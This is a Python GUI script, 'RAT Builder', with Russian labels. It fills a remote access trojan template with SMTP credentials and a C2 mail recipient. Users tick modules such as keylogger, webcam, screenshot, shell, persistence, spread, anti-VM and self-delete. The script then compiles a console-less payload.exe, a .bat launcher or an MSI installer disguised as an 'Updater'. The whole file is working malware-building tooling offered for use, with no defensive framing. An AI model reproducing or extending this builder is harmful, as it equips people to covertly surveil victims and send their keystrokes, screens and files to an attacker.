# language: Python, file: builder.py
# *GUI-билдер: SAFE_MODE по умолчанию true, PyInstaller или Nuitka, проверка магии файла*
import os, sys, json, subprocess, tempfile, pathlib, shutil
import tkinter as tk
from tkinter import ttk, filedialog, messagebox

TEMPLATE = pathlib.Path(__file__).parent / "rat_template.py"

class Builder(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("RAT Builder")
        self.geometry("600x640")
        self.vars = {}
        self.mods = {}
        self._ui()

    def _ui(self):
        frm = ttk.Frame(self, padding=10)
        frm.pack(fill="both", expand=True)
        frm.columnconfigure(1, weight=1)

        fields = [
            ("smtp_host", "SMTP host", "smtp.gmail.com"),
            ("smtp_port", "SMTP port", "587"),
            ("smtp_user", "Email (from)", ""),
            ("smtp_pass", "App password", ""),
            ("mail_to",  "Recipient (C2)", ""),
        ]
        r = 0
        for k, label, default in fields:
            ttk.Label(frm, text=label).grid(row=r, column=0, sticky="w", pady=3)
            v = tk.StringVar(value=default)
            ttk.Entry(frm, textvariable=v, width=48,
                      show="*" if k == "smtp_pass" else "").grid(
                row=r, column=1, sticky="ew", pady=3)
            self.vars[k] = v
            r += 1

        ttk.Label(frm, text="Формат").grid(row=r, column=0, sticky="w", pady=4)
        self.fmt = tk.StringVar(value="exe")
        ttk.Combobox(frm, textvariable=self.fmt, values=["exe", "dll", "bat", "msi"],
                     state="readonly", width=10).grid(row=r, column=1, sticky="w")
        r += 1

        ttk.Label(frm, text="Компилятор").grid(row=r, column=0, sticky="w")
        self.comp = tk.StringVar(value="pyinstaller")
        ttk.Combobox(frm, textvariable=self.comp, values=["pyinstaller", "nuitka"],
                     state="readonly", width=12).grid(row=r, column=1, sticky="w")
        r += 1

        self.var_safe = tk.BooleanVar(value=True)
        ttk.Checkbutton(frm, text="SAFE_MODE (не ломает систему, только логирует)",
                        variable=self.var_safe).grid(row=r, column=0, columnspan=2,
                                                     sticky="w", pady=4)
        r += 1

        mods = ttk.LabelFrame(frm, text="Модули", padding=6)
        mods.grid(row=r, column=0, columnspan=2, sticky="ew", pady=6)
        for i, m in enumerate(["persistence", "keylogger", "screenshot", "shell",
                               "download", "upload", "clipboard", "processes",
                               "webcam", "spread", "antivm", "selfdelete"]):
            v = tk.BooleanVar(value=(m not in ("spread", "selfdelete")))
            ttk.Checkbutton(mods, text=m, variable=v).grid(row=i // 3, column=i % 3, sticky="w")
            self.mods[m] = v
        r += 1

        ttk.Button(frm, text="Собрать", command=self.build).grid(
            row=r, column=0, columnspan=2, pady=10, sticky="ew")

    def build(self):
        cfg = {k: v.get() for k, v in self.vars.items()}
        cfg["safe_mode"] = self.var_safe.get()
        cfg["modules"] = [k for k, v in self.mods.items() if v.get()]
        fmt = self.fmt.get()
        comp = self.comp.get()

        if not cfg["smtp_user"] or not cfg["smtp_pass"] or not cfg["mail_to"]:
            messagebox.showerror("Ошибка", "Заполните SMTP и получателя.")
            return

        work = pathlib.Path(tempfile.mkdtemp(prefix="ratbuild_"))
        src = work / "rat.py"
        text = TEMPLATE.read_text(encoding="utf-8")
        text = text.replace("__CFG__", json.dumps(cfg, ensure_ascii=False))
        src.write_text(text, encoding="utf-8")

        out_dir = pathlib.Path(filedialog.askdirectory(title="Куда сохранить"))
        if not out_dir:
            return

        try:
            produced = self._compile(src, work, fmt, comp, out_dir)
        except Exception as e:
            messagebox.showerror("Ошибка сборки", str(e))
            return

        if not self._validate(produced, fmt):
            try: os.remove(produced)
            except OSError: pass
            messagebox.showerror("Ошибка", "Неверное расширение. Измените на другое!")
            return
        messagebox.showinfo("Готово", f"Файл: {produced}")

    def _compile(self, src, work, fmt, comp, out_dir):
        if fmt == "bat":
            bat = out_dir / "payload.bat"
            bat.write_text(f'@echo off\r\nstart "" /b "{sys.executable}" "{src}"\r\n',
                           encoding="utf-8")
            return str(bat)

        if fmt == "msi":
            exe = self._compile(src, work, "exe", comp, out_dir)
            wxs = work / "p.wxs"
            wxs.write_text(f'''<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="Updater" Version="1.0.0" Manufacturer="X"
           UpgradeCode="11111111-1111-1111-1111-111111111111">
    <Package InstallerVersion="200" Compressed="yes"/>
    <Media Id="1" Cabinet="p.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLDIR" Name="Updater">
          <Component Id="C" Guid="22222222-2222-2222-2222-222222222222">
            <File Id="F" Source="{exe}"/>
          </Component>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="F1" Level="1"><ComponentRef Id="C"/></Feature>
  </Product>
</Wix>''', encoding="utf-8")
            subprocess.run(["candle", str(wxs), "-o", str(work / "p.wixobj")], check=True)
            subprocess.run(["light", str(work / "p.wixobj"),
                            "-o", str(out_dir / "payload.msi")], check=True)
            return str(out_dir / "payload.msi")

        name = "payload.exe" if fmt in ("exe", "dll") else "payload.exe"
        if comp == "nuitka":
            args = [sys.executable, "-m", "nuitka", "--onefile",
                    "--windows-disable-console", "--assume-yes-for-downloads",
                    f"--output-dir={out_dir}", f"--output-filename={name}", str(src)]
            subprocess.run(args, check=True, capture_output=True)
            return str(out_dir / name)

        args = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
                "--name", "payload", "--distpath", str(out_dir), str(src)]
        subprocess.run(args, check=True, capture_output=True)
        return str(out_dir / "payload.exe")

    def _validate(self, path, fmt):
        try:
            with open(path, "rb") as f:
                head = f.read(8)
            if fmt in ("exe", "dll"):
                return head.startswith(b"MZ")
            if fmt == "msi":
                return head.startswith(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")
            if fmt == "bat":
                txt = open(path, "r", errors="ignore").read(4096).lower()
                return any(txt.lstrip().startswith(p) for p in ("@echo", "::", "rem ", "echo "))
        except Exception:
            return False
        return False

if __name__ == "__main__":
    Builder().mainloop()
